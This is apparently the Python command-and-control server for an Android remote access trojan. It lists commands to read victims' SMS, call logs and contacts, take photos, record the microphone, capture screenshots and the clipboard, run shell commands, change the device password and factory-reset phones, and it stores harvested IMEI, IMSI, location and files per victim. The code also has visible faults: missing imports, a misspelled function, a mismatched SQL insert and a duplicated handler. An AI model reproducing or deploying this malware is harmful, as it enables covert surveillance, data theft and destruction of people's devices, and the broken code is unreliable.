from sqlite3.dbapi2 import Error
from flask import Flask, json, request,  make_response
from flask_socketio import SocketIO, emit, join_room, rooms
import sqlite3
from routes import views

# below dashboard pass data from nav link ro confirm original request
app = Flask(__name__)
app.register_blueprint(views)
app.secret_key = 'the rastafarian in you'
socketio = SocketIO(app)

''' COMMAND LIST
0x0 - Send SMS
0x1 - Read SMS
0x2 - Read Call Log
0x3 - Make Phone Call
0x4 - Dial USSD (API 26+)
0x5 - Read Contacts
0x6 - Write Contact
0x7 - Screenshot
0x8 - Get Camera List
0x9 - Take Picture
0xA - Record Mic
0xB - sh Command
0xC - List Installed Apps
0xD - Vibrate Phone
0xE - Change Wallpaper
0xF - Factory Reset Device
0x10 - Reboot Device
0x11 - Change Device Password
0x12 - Clipboard Monitoring
'''

def write_to_log_file(data):
    with open('c2.log', 'a') as f:
        f.write(f"{str(datetime.datetime.now().strftime('%d/%b/%Y %I:%M:%S %p'))} {data['device_id']}: {data['message']}")

def log_to_console(data):
    if data['status'] == 'success':
        emit("log", {'data': [f"{data['device_id']}: {data['message']}", 'success']})
    else:
        emit("log", {'data': [f"{data['device_id']}: {data['message']}", 'danger']})
    write_to_log_file(data)


def update_database_and_log(value, data):
    if data['status'] == 'success':
        try:
            con = sqlite3.connect("database.db")
            cur = con.cursor()
            cur.execute(f"UPDATE victim SET {value}=? WHERE deviceid=?", (data['data'], data['device_id']))
            con.commit()
        except sqlite3.Error as error:
            print(error)
        emit("log", {'data': [f"{data['device_id']}: {data['message']}", 'success']})
    else:
        emit("log", {'data': [f"{data['device_id']}: {data['message']}", 'danger']})
    log_to_console(data)
    write_to_log_file(data)


def write_bytes_and_log(data):
    f = open(f"files/{data['device_id']}/{str(rount(time.time() * 1000))}.{data['ext']}", 'wb')
    f.write(data['bytes'])
    f.close()
    write_to_log_file(data)

# Connection from C2
@socketio.on('connect')
def test_connect():
    with open('server_soc_id.txt', 'w') as f:
        f.write(request.sid)
    emit('after connect',  {'data':'Session starting ...'})
    try:
        con = sqlite3.connect("database.db")
        cur = con.cursor()
        cur.execute("SELECT * FROM victim")
        record = cur.fetchall()
        con.close()
        if record.__len__() != 0:
            emit("victims", {'data' : record})
        else:
            emit("victims", {'data' : 'None'})
    except sqlite3.Error as error:
        print("something went wrong")


# Connection from android
@socketio.on('android_connect')
def value_changed(data):
    print(data)
    sid = ""
    with open('server_soc_id.txt', 'r') as f:
        sid = f.read()
    try:
        con = sqlite3.connect("database.db")
        cur = con.cursor()
        cur.execute("SELECT * FROM victim WHERE deviceid= ?", (data['device_id'],))
        record = cur.fetchall()
        if record.__len__() == 0:
            cur.execute(
                "INSERT INTO victim(model, deviceid, ipaddress, api, imei, socketid, phone, imsi, location) VALUES(?, ?, ?, ?, ?, ?, ?)",
                (
                    data['model'],
                    data['device_id'],
                    request.remote_addr,
                    data['api'],
                    data['imei'],
                    request.sid,
                    data['phone'],
                    data['imsi'],
                    data['location'],
                )
            )
            con.commit()
        else:
            if record[0][3] != request.remote_addr:
                cur.execute("UPDATE victim SET ipaddress=? WHERE deviceid=?", (request.remote_addr, data['device_id']))
                con.commit()
                emit("update victim ip", {'data' : [data['device_id'], 'light', request.remote_addr]})
            if record[0][6] != request.sid:
                cur.execute("UPDATE victim SET socketid=? WHERE deviceid=?", (request.sid, data['device_id']))
                con.commit()
                emit("update victim socketid", {'data' : [data['device_id'], request.sid]})
        con.close()
    except sqlite3.Error as error:
        print(error)
    emit("new device", {'data': [data['model'], data['device_id'], request.remote_addr, data['api'], data['imei'], request.sid, "phone", "imsi", "location"]})

    # emit('android value', message, broadcast=True,)

@socketio.on('pong')
def pong(data):
    sid = ""
    with open('server_soc_id.txt', 'r') as f:
        sid = f.read()
    emit("pingback", {"deviceid" : data['device_id']}, to=sid)
     

@socketio.on('Slider value changed')
def value_changed(message):
    print(message['data'])
    emit('update value', message, broadcast=True,)


@socketio.on('0x0')
def send_sms_listener(data):
    log_to_console(data)


@socketio.on('0x1')
def read_sms_listener(data):
    update_database_and_log('readsms', data)


@socketio.on('0x2')
def read_call_log_listener(data):
    update_database_and_log('readcalllogs', data)


@socketio.on('0x3')
def make_phone_call_listener(data):
    log_to_console(data)


@socketio.on('0x4')
def dial_ussd_listener(data):
    log_to_console(data)


@socketio.on('0x5')
def read_contacts_listener(data):
    update_database_and_log('readcontacts', data)


@socketio.on('0x6')
def write_contact_listener(data):
    log_to_console(data)


@socketio.on('0x7')
def screenshot_listener(data):
    write_bytes_and_log(data)


@socketio.on('0x8')
def get_camera_list_listener(data):
    update_database_and_log('cameralist', data)


@socketio.on('0x9')
def take_picture_listener(data):
    write_bytes_and_log(data)


@socketio.on('0xA')
def record_mic_listener(data):
    write_bytes_and_log(data)


@socketio.on('0xB')
def sh_command_listener(data):
    log_to_console(data)


@socketio.on('0xC')
def list_installed_apps_listener(data):
    update_database_and_log('installedapps', data)


@socketio.on('0xD')
def vibrate_phone_listener(data):
    log_to_console(data)


@socketio.on('0xE')
def change_wallpaper_listener(data):
    log_to_console(data)


@socketio.on('0xF')
def factory_listener_listener(data):
    log_to_console(data)


@socketio.on('0x10')
def reboot_device_listener(data):
    log_to_console(data)


@socketio.on('0x11')
def change_device_passowrd_listener(data):
    log_to_console(data)


@socketio.on('0x12')
def clipboard_monitoring(data):
    with open(f"files/{data['device_id']}/clipboard.txt", 'a') as f:
        f.write(data['clip'])
    log_to_console(data)


@socketio.on('0x12')
def play_audio(data):
    log_to_console(data)

if __name__ == "__main__":
    socketio.run(app, host="0.0.0.0", port=5001, debug=True)
